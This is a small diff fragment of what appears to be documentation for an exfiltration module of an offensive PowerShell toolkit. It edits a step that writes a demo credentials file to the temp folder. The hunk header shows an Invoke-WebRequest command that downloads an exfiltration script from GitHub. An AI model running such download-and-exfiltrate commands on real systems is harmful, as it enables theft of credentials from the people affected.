@@ -212,7 +212,7 @@ iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Exfilt
 
 **Create credentials demo text file**
 ```powershell
-echo "password=r00t3xp10it" > $Env:TMP\creds.txt
+echo "password=r00t3xp10it`npassw=PasteBin" > $Env:TMP\creds.txt
 ```
 
 **execute:**
